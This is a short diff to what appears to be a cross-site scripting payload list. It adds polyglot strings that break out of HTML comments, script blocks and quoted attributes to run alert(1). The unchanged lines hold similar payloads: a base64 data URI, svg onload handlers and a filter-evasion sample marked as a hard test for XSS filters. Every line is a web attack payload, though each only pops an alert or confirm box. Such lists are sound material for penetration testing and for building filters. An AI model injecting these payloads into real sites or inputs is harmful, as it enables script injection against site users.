@@ -16,6 +16,10 @@ data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= /
 1"--></script><svg/onload=';confirm(domain);'>
 
 
+--></script>">'><script>alert(1)</script>
+
+';alert(1)//';alert(1)//";alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>
+
 <svg </onload ="1> (_=alert,_(1337)) ""> // Hard test for XSS filters
 
 <svg><x><script>alert&#40;1&#41</x>
